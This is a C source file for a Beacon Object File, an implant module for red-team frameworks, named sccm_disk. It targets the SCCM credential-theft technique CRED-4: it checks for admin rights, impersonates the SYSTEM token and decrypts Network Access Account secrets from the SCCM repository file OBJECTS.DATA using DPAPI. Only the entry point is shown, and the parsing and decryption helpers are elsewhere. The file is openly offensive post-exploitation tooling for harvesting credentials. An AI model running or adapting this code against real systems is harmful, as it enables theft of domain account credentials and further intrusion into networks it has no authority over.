/*
 * sccm_disk.c — BOF for SCCM CRED-4 triage
 *
 * Usage:
 *   sccm_disk [/target:PATH]
 *
 * Parses SCCM CIM repository data from OBJECTS.DATA (CRED-4)
 * and decrypts NAA PolicySecret blobs locally with
 * CryptUnprotectData as SYSTEM.
 * Requires high integrity (admin).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* target_str = BeaconDataExtract(&parser, NULL);
    wchar_t* target = NULL;
    BOOL already_system = FALSE;
    BOOL impersonated = FALSE;

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM disk triage requires high integrity (admin) context\n");
        return;
    }

    if (target_str && strlen(target_str) > 0) {
        target = utf8_to_wide(target_str);
        if (!target) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert /target path to UTF-16\n");
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-4 (BOF) ===\n");

    already_system = is_system();
    if (!already_system) {
        if (!get_system()) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
            goto cleanup;
        }
        impersonated = TRUE;
    }

    triage_sccm_disk(NULL, target);

cleanup:
    if (impersonated) revert_to_self_helper();
    if (target) intFree(target);
}
